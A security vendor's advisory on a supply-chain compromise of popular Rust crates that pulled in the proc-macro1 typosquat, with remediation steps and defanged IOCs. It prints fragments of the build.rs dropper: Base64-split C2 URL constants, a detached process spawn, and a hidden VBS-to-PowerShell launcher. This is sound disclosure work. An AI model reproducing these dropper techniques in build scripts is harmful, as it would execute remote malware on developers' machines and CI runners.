---
excerpt: "On August 20th, the popular Rust crates arrayref, internment, and append-only-vec were compromised on crates.io. The malicious versions silently pulled in proc-macro1, a typosquat of proc-macro2, whose build.rs downloads and executes a remote payload on cargo build."
title: "Compromised Rust crates on crates.io silently execute malware at build time"
date: "August 20, 2026"
description: "Yair Benamou, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/proc-macro1.png
type: realTimePost
minutes: '5'
---

The JFrog security research team has identified a compromise in 3 widely used Rust crates on crates.io: `arrayref@0.3.10` (~245M downloads), `internment@0.8.7` (~14.4M downloads), and `append-only-vec@0.1.9` (~4.5M downloads). All three silently pulled in `proc-macro1`, a typosquat of the legitimate `proc-macro2` crate.

![](/img/RealTimePostImage/post/proc-macro1.png)

As of now, the malicious crate versions and `proc-macro1` itself have been removed from crates.io. The three parent crates share the same crates.io owner (`droundy`).

`arrayref` is a small, widely depended-on crate of macros for taking array references of slices. `internment` provides string/data interning, and `append-only-vec` is a concurrent append-only vector. In Rust, a `build.rs` script is compiled and executed automatically during `cargo build`, `cargo check`, and similar commands, including CI and rust-analyzer driven builds.

If you refreshed a lockfile during the exposure window (~7-8 AM UTC), assume the environment that ran Cargo is affected. Check `Cargo.lock` for the compromised package versions or any `proc-macro1` entry.

## Attack chain

The malware operates in multiple stages. The crates themselves only deliver the first two.

### Stage 1 - Compromised popular crates

The attacker published new versions of otherwise legitimate crates. Those versions added a dependency on `proc-macro1` rather than embedding the dropper in the parent crate source. Downstream users who ran `cargo update` (or otherwise resolved a new lockfile) pulled the typosquat transitively.

### Stage 2 - `proc-macro1` `build.rs` dropper

`proc-macro1` 1.0.107 impersonates `proc-macro2` 1.0.107. The library source is a renamed copy of the real crate. The author field is spoofed as `David Tolnay <rchaitm@gmail.com>`, and the repository is set to `https://github.com/dtolnay/proc-macro1`.

The only attacker-added runtime is in `build.rs`, plus three build-dependencies the real `proc-macro2` does not need: `ureq`, `rustls`, and `base64`. The script still emits the legitimate proc-macro2 cfg probes, with the download-and-execute block inserted in the middle.

C2 URLs are stored as split Base64 fragments and concatenated at runtime:

```rust
const SRC_URL_PARTS: &[&str] = &["aHR0cHM6Ly8=", "MjMuMjU0Lg==", "MTY1Lg==", "MTEyOg==", "OTA4OS8="];
const END_URL_PARTS: &[&str] = &["MjMuMjU0Lg==", "MTY1Lg==", "MTEyOg==", "NDQz"];
```

Decoded, those become:

- Download prefix: `hxxps[:]//23[.]254[.]165[.]112:9089/`
- Follow-on C2 argument: `23[.]254[.]165[.]112:443`

At this time of writing, the endpoint is not available.

TLS certificate verification is disabled (`AcceptAll` rustls verifier), so self-signed or mismatched certificates are accepted.

### Stage 3 - OS-specific remote payload

`build.rs` downloads a platform-specific blob and launches it detached:

| Host | URL suffix | Drop path | Launcher |
| :---- | :---- | :---- | :---- |
| Linux x86_64 | `rust-crate_0.1.0` | `/tmp/rust-setup` | `chmod +x` then spawn with the C2 argument |
| Windows x86_64 | `rust-crate_0.2.0` | `%TEMP%\rust-setup.ps1` | hidden `wscript` → PowerShell `-ExecutionPolicy Bypass` |
| macOS x86_64 | `rust-crate_0.3.0` | `/tmp/rust-setup` | `chmod +x` then spawn with the C2 argument |
| macOS aarch64 | `rust-crate_0.4.0` | `/tmp/rust-setup` | `chmod +x` then spawn with the C2 argument |

On Unix, the dropper writes `/tmp/rust-setup`, marks it executable, and spawns it with no stdin/stdout/stderr and without waiting:

```rust
Command::new(&path)
    .arg(end_url())
    .stdin(Stdio::null())
    .stdout(Stdio::null())
    .stderr(Stdio::null())
    .spawn()
```

On Windows, it writes `rust-setup.ps1` and a one-line VBS launcher (`rust-setup-launch.vbs`). The VBS path is deliberate: children of a Cargo build script otherwise stay in Cargo's job object and stall the build until they exit. `CREATE_NO_WINDOW` hides the console.

The dropped file is started with a single argument, `23[.]254[.]165[.]112:443`. That is the follow-on C2 for whatever the remote blob implements.

## The second-stage payload is currently unavailable

The second-stage URLs on `23[.]254[.]165[.]112:9089` did not respond, so we could not recover the remote payload. That does not mean the attack failed: `arrayref` has ~245 million lifetime downloads, and any `cargo build` against a refreshed lockfile during the window was enough to execute whatever the operator was serving.

## Remediation

For anyone who resolved `arrayref==0.3.10`, `internment==0.8.7`, `append-only-vec==0.1.9`, or any `proc-macro1` entry:

* **Validate** `Cargo.lock` (and vendored/`cargo vendor` trees) for those versions or a `proc-macro1` package  
* **Remove** the compromised versions and pin to the last known-clean releases: `arrayref` 0.3.9, `internment` 0.8.6, `append-only-vec` 0.1.8  
* **Regenerate** lockfiles from trusted crates.io metadata after the malicious versions were deleted  
* **Hunt** for `/tmp/rust-setup`, `%TEMP%\rust-setup.ps1`, and `%TEMP%\rust-setup-launch.vbs`  
* **Block** communication to `23[.]254[.]165[.]112` on ports `9089` and `443`  
* **Revoke and rotate** credentials from any developer machine or CI runner that ran Cargo against an affected lockfile. Assume secrets available to that environment are exposed.  
* **Scan for additional persistence**: the second-stage blob was not recovered; treat confirmed execution as a full host compromise.

## Conclusions

This incident is a crates.io account/publish compromise that used a `proc-macro2` typosquat as the actual malware carrier. The popular crates did not need to contain an obvious malicious source; they only needed to pull `proc-macro1`. Because Cargo runs `build.rs` at compile time, installing or building a dependent project is enough.

The fact that the payload URL is now inactive does not mean the attack failed. Due to the popularity of `arrayref`, even a short period of activity can expose users, leak secrets, and implant follow-on malware that is no longer in the crate.

JFrog Curation customers using an immaturity policy were fully protected from this attack, as all hijacked packages were flagged on the same day.

## Affected Packages

| Package | Version | Xray ID |
| :---- | :---- | :---- |
| `arrayref` | `0.3.10` | XRAY-1058267 |
| `internment` | `0.8.7` | XRAY-1058269 |
| `append-only-vec` | `0.1.9` | XRAY-1058268 |
| `proc-macro1` | `1.0.107` | XRAY-1058266 |
| `proc-macro-en` | `1.0.10` | TBD |

The Rust Security Response Team also deleted several related lookalike crates. Unlike `proc-macro1`, these do not download a remote payload: they are typosquats of legitimate crates, and at most run a trivial `build.rs` as a staging check that Cargo will execute attacker-controlled build scripts.

| Package | Versions | Notes | Xray ID |
| :---- | :---- | :---- |
| `aovine` | All | Typosquat of `append-only-vec`; `build.rs` writes `Hello from build.rs` to `/tmp/echo.txt` | TBD |
| `arone` | All | Typosquat of `arrayref`; `build.rs` only echoes a string | TBD |
| `aronenao` | All | Typosquat of `arrayref`; `build.rs` sets a dummy `cargo:rustc-env` | TBD |
| `tinymember` | All | Typosquat of `tiny-skia`; no `build.rs`, depends on `aronenao` | TBD |

## IOCs

* `hxxps[:]//23[.]254[.]165[.]112:9089/`  
* `hxxps[:]//23[.]254[.]165[.]112:9089/rust-crate_0.1.0`  
* `hxxps[:]//23[.]254[.]165[.]112:9089/rust-crate_0.2.0`  
* `hxxps[:]//23[.]254[.]165[.]112:9089/rust-crate_0.3.0`  
* `hxxps[:]//23[.]254[.]165[.]112:9089/rust-crate_0.4.0`  
* `23[.]254[.]165[.]112:443`  
* `/tmp/rust-setup`  
* `%TEMP%\rust-setup.ps1`  
* `%TEMP%\rust-setup-launch.vbs`  
